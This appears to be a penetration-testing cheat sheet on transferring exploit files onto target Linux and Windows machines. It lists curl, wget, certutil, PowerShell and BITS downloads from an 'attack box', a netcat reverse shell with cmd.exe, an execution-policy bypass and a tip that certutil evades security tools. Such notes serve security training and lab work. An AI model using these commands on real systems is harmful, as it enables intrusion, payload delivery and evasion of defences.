# Transferring Exploits

In this section, we will discuss transferring exploits using Windows, Linux, Netcat, wget, VBScript, PowerShell and more.



## Linux Transfers

There are a number of ways to transfer using Linux:

* curl

  * `curl http://172.16.1.1:8000/exploit.exe -O` - Downloads to `exploit.exe`
  * `curl http://172.16.1.1:8000/exploit.exe -o test123.exe` - Downloads to test123.exe

* Apache2

  ```bash
  cp exploit /var/www/html # The default web root directory
  service apache2 start || systemctl start apache2
  firefox http://[IP Webserver]  || wget http://[IP Webserver]
  service stop start || systemctl stop apache2
  ```

* Python SimpleHTTPServer

  *  :exclamation: - serves all files and directories from the directory executed from. Only run from dedicated directory.
  * Python2 - `sudo python -m SimpleHTTPServer [Optional: port]`
  * Python3 - `sudo python3 -m http.server [Optional: port]`

* wget

  * `wget http://172.16.1.1:8000/exploit.exe`

## Windows Transfers

Windows systems don't have a native tool like wget, so it's a bit more difficult.
They do have tools like certutil.exe, VBScript. and PowerShell. 

* certutil - installed as part of Certificate Services.

  * :exclamation: - Used for Living Off Land as it's pre-installed, and has extra functionality like downloading.

  * :exclamation: - Can download malware bypassing security programs, and can base64 encode / decode.

  * ```shell
    certutil -urlcache -split -f [URL] [Filename.Extension]
    # -urlcache: Displays or delete URL cache entries
    # -f : Forces fetching a specific URL and updating the cache
    # -split: Split embedded ASN.1 elements, and save to files on disk
    ```

  * `certutil -urlcache -split -f http://172.16.1.3 nc.exe` - Downloads `nc.exe` to the local machine

  * ```shell
    # Base64 encode a file - this encodes nc.exe into a text file nc.txt containing the base64 contents
    certutil.exe -encode nc.exe nc.txt
    
    # Verify
    powershell -command "Get-Content nc.txt -Head 10"
    
    # Transfer
    certutil.exe -decode nc.txt nc.exe
    
    # Validate
    nc.exe [Attack box IP] 5555 -e cmd.exe
    ```

  * https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil

  * https://ss64.com/nt/certutil.html

  * https://attack.mitre.org/software/S0160/

  * https://github.com/LOLBAS-Project/LOLBAS

  * Https://lolbas-project.github.io/lolbas/Binaries/Certutil

* VBScript

* PowerShell

  *  ```powershell
     # Create a simple download script
     echo $webclient = New-Object System.Net.WebClient > httpdownload.ps1
     echo $webclient.DownloadFile("[Download URL]","File Name]") >> httpdownload.ps1
     
     # Execute the script
     powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File httpdownload.ps1
     ```

  * `powershell -c "(new-object System.Net.WebClient)".DownloadFile('[Download URL]', '[File Name]')"` - One liner to achieve same effect. -c executes the following command provided.

  * :exclamation: - In order to execute Powershell scripts, the execution policy should allow scripts to be run. The default is `Restricted` which will not permit this. Verify with `Get-ExecutionPolicy` and modify with `Set-ExecutionPolicy Unrestricted` 

* PowerShell Start-BitsTransfer

  * BITS BackGround Intelligent Transfer Service. Creates a cmdlet to trasnfer files between a client and server. Allows you to limit bandwidth, process multi-downloads, set a web proxy, and can use idle network bandwidth. It must be enabled (although usually on by default), and designed to process in the background, so can wait for a running job to complete.
  * `powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://[IP Attack box]/nc.exe -Destination C:\`
  * https://technet.microsoft.com/en-us/library/dd819420.aspx
  * https://msdn.microsoft.com/en-us/library/aa362708.aspx

* PowerShell Invoke-WebRequest - requires at least PowerShell 3.0 - `powershell $PSVersionTable.PSVersion`

  * `powershell Invoke-WebRequest -Uri http://[IP Attack box]/nc.exe -OutFile C:\nc.exe`
  * https://doc.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-3.0

  

  ### Netcat

  * ```bash
    # Setup a listener first on the target
    nc -lvp 8080 > /root/Desktop/transfer.txt
    
    # Connect from the attack box
    nc 192.168.100.107 8080 < /root/Desktop/transfer.txt
    ```